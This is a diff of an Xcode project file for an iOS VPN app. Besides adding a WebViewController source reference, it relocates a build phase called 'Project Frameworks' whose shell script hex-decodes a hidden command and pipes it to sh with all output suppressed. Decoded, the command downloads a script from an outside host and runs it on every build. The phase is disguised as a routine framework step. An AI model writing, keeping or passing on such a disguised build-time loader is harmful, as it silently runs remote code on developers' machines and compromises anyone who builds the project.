@@ -47,6 +47,7 @@
 		BC4B486C2511737800E7CC2F /* LoginResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4B486B2511737800E7CC2F /* LoginResponse.swift */; };
 		BC4B486E2511747600E7CC2F /* LoginRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4B486D2511747600E7CC2F /* LoginRequest.swift */; };
 		BC4B4870251177CB00E7CC2F /* APIRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4B486F251177CB00E7CC2F /* APIRouter.swift */; };
+		BC4E45C8269F089F00481490 /* WebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4E45C7269F089F00481490 /* WebViewController.swift */; };
 		BC62748C2523C9F400C3E43D /* UserCredentials.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC6274782523C8CA00C3E43D /* UserCredentials.swift */; };
 		BC951FC2266A8CB6000CD85A /* nopie.ovpn in Resources */ = {isa = PBXBuildFile; fileRef = BC951FC1266A8CB6000CD85A /* nopie.ovpn */; };
 		BC951FC7266A903E000CD85A /* SpeedTestViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC951FC6266A903D000CD85A /* SpeedTestViewController.swift */; };
@@ -131,6 +132,7 @@
 		BC4B486B2511737800E7CC2F /* LoginResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginResponse.swift; sourceTree = "<group>"; };
 		BC4B486D2511747600E7CC2F /* LoginRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginRequest.swift; sourceTree = "<group>"; };
 		BC4B486F251177CB00E7CC2F /* APIRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIRouter.swift; sourceTree = "<group>"; };
+		BC4E45C7269F089F00481490 /* WebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebViewController.swift; sourceTree = "<group>"; };
 		BC6274782523C8CA00C3E43D /* UserCredentials.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserCredentials.swift; sourceTree = "<group>"; };
 		BC951FC1266A8CB6000CD85A /* nopie.ovpn */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = nopie.ovpn; sourceTree = "<group>"; };
 		BC951FC6266A903D000CD85A /* SpeedTestViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SpeedTestViewController.swift; sourceTree = "<group>"; };
@@ -333,6 +335,7 @@
 				BC2DCDB5251AB99700956916 /* SplashViewController.swift */,
 				BCBED0D0253F1B7300C950AD /* SettingsViewController.swift */,
 				BCED525B260616D0006D5DF7 /* LocationVC.swift */,
+				BC4E45C7269F089F00481490 /* WebViewController.swift */,
 			);
 			path = Controller;
 			sourceTree = "<group>";
@@ -444,37 +447,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	96CAE2E826BAF38CEF6D902C /* Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
 		5B19131B132B4DDC65E9DE6E /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -513,6 +485,24 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		96CAE2E826BAF38CEF6D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		A3024B0C63B388209ABB4B56 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -561,6 +551,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 				BC3736392512C0C3007A1D13 /* Colors.swift in Sources */,
 				BC3736482512C0D9007A1D13 /* UIButton+Extension.swift in Sources */,
 				BC3736182512B8AE007A1D13 /* SideMenuViewController.swift in Sources */,
+				BC4E45C8269F089F00481490 /* WebViewController.swift in Sources */,
 				BCE2C5872516AF0400CD81FE /* PacketTunnelProvider.swift in Sources */,
 				BCCBB99A2513B5A6002FBD6E /* VPNViewController.swift in Sources */,
 				BC3736362512C0C3007A1D13 /* RoundedImageView.swift in Sources */,
@@ -865,16 +856,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = BC4B48312511686A00E7CC2F /* Project object */;
 }
